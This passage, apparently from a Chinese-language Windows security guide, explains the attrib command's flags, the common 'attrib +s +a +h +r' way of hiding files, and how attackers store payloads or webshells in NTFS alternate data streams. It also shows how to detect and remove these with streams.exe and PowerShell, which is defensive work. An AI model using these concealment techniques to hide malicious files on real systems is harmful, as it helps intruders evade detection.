 参数 说明 `{+\|-}r` 设置 (+) 或清除 (-) 只读文件属性。 `{+\|-}a` 设置 (+) 或清除 (-) 存档文件属性。 此属性集标记自上次备份以来发生更改的文件。 xcopy 命令使用存档属性。 `{+\|-}s` 设置 (+) 或清除 (-) 系统文件属性。 如果文件使用此属性集，则必须先清除该属性，然后才能更改该文件的任何其他属性。 `{+\|-}h` 设置 (+) 或清除 (-) 隐藏文件属性。 如果文件使用此属性集，则必须先清除该属性，然后才能更改该文件的任何其他属性。 `{+\|-}o` 设置 (+) 或清除 (-) 脱机文件属性。 `{+\|-}i` 设置 (+) 或清除 (-) 非内容索引文件属性。 `{+\|-}x` 设置 (+) 或清除 (-) 推移文件属性。 `{+\|-}p` 设置 (+) 或清除 (-) 固定的文件属性。 `{+\|-}u` 设置 (+) 或清除 (-) 取消固定的文件属性。 `{+\|-}b` 设置 (+) 或清除 (-) SMR Blob 文件属性。 `[<drive>:][<path>][<filename>]` 指定要查看或更改其属性的目录、文件或文件组的位置和名称。 可以在 filename 参数中使用 ? 和 * 通配符来显示或更改一组文件的属性。 /s 将 attrib 和任何命令行选项应用于当前目录及其所有子目录中的匹配文件。 /d 将 attrib 和任何命令行选项应用于目录。 /l 将 attrib 和任何命令行选项应用于符号链接，而不是符号链接的目标。 /? 在命令提示符下显示帮助。 比较常见的隐藏方法

 `attrib +s +a +h +r 文件地址

```
 其实也就是

 - 设置系统文件属性
 - 设置存档文件属性
 - 设置隐藏文件属性
 - 设置文件只读属性

 将参看 -> 选项 -> 文件夹选项 -> 查看中的隐藏受保护的操作系统文件(推荐) 前面的选项取消勾选就可以看到了

可以通过  `attrib name` 的方式查看某个文件或文件夹的属性

确定属性后，可以通过 `attrib -x` 来取消相关属性设置

 `attrib -s -a -h -r 文件地址

```

### 3. NTFS 备用数据流

在 NTFS 文件系统中允许一个文件或目录拥有多个独立的“数据流”（streams）。每个文件都有一个主数据流（默认可见的内容，例如文本文件里的文字），而 ADS 则是附加的“隐藏流”，可以存储额外的数据（如二进制、文本或元数据）。

攻击者可以将恶意内容放在隐藏流中，之后无论是二进制还是 webshell 这类的文本都可以正常调用，直接使用 `dir` 是看不到的

一般 ADS 的用途为: 互联网下载文件标记

Windows 使用 ADS 的 `:Zone.Identifier:$DATA` 流来标记文件来源（e.g., 从互联网下载的文件会附加这个流，记录“Internet Zone”）。这触发安全警告（如“此文件可能不安全”），并与 SmartScreen 或 Defender 集成。

### 3) 使用 streams.exe 查看和删除备用数据流

`SysinternalsSuite` 中的 `streams.exe` 就是用来干这个的

查看 NTFS 备用数据流

 `streams64.exe -s <dir>

```

删除 NTFS 备用数据流

 `streams64.exe -d <file>

```

### 4) 通过 PowerShell 查看和删除备用数据流

查看 NTFS 备用数据流

 `Get-Item -Path demo.txt -Stream *
Get-Content -Path demo.txt -Stream hidden_stream.txt

```

删除 NTFS 备用数据流

 `Remove-Item -Path demo.txt -Stream hidden_stream.txt

```
